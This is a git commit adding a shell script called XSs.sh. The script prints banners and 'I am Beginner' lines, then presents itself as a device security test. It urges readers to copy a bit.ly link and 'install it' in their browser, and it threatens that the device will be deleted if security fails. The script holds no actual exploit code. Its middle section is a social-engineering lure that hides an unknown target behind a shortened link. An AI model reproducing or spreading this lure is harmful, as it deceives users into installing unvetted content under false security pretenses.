fc33be6c4e3f459df5896f58796a603b663ab9a3
alfrzy10 <89910841+alfrzy10@users.noreply.github.com>
2021-09-01 17:21:55 +0700

    Add files via upload
    Script nya tinggal copy paste di atas, klo ga ada buka lewat Chrome

---
+++ XSs.sh
@@ -0,0 +1,54 @@
+echo "	Github   : alfrzy10"
+echo " 	Coded by : Me "
+								
+
+toilet -f big     Habibie Af				
+	     									
+echo "--------------------------------------------------------"
+echo "I am Beginner I am Beginner I am Beginner I am Beginner" 
+echo "I am Beginner I am Beginner I am Beginner I am Beginner"
+echo "I am Beginner I am Beginner I am Beginner I am Beginner"
+echo "I am Beginner I am Beginner I am Beginner I am Beginner"
+echo "I am Beginner I am Beginner I am Beginner I am Beginner"
+echo "---------------------------------------------------------"				
+echo
+echo "--------------------------------------------------------"
+echo "I am Beginner I am Beginner I am Beginner I am Beginner" 
+echo "I am Beginner I am Beginner I am Beginner I am Beginner"
+echo "I am Beginner I am Beginner I am Beginner I am Beginner"
+echo "I am Beginner I am Beginner I am Beginner I am Beginner"
+echo "I am Beginner I am Beginner I am Beginner I am Beginner"
+echo "---------------------------------------------------------"				
+echo
+echo
+sleep 1
+echo
+echo		
+echo " This script is very Simple & easy
+ This tool is only for testing the security system on your device.
+ if the security system on your device fails, on your Devices
+ will be deleted automatically
+ To start the test, please copy the link below and install it
+ in your Browser"
+sleep 2
+echo 		
+echo "		L1NK :- https://bit.ly/3ild93L"								
+echo "			👆👆👆 👆👆👆"
+echo
+echo "don't misuse this script the admin is not responsible if something happens"
+echo "📱📲 "
+echo
+read -p "type Exit :"
+echo 
+echo "		𝕿𝖍𝖆𝖓𝖐𝖘 𝖋𝖔𝖗 𝖚𝖘𝖎𝖓𝖌 𝕺𝖚𝖗 𝕾𝖈𝖗𝖎𝖕𝖙"
+echo "		𝐓𝐡𝐚𝐧𝐤𝐬 𝐟𝐨𝐫 𝐮𝐬𝐢𝐧𝐠 𝐎𝐮𝐫 𝐒𝐜𝐫𝐢𝐩𝐭"
+										
+							
+						
+									
+		
+					
+			
+						
+		
+		
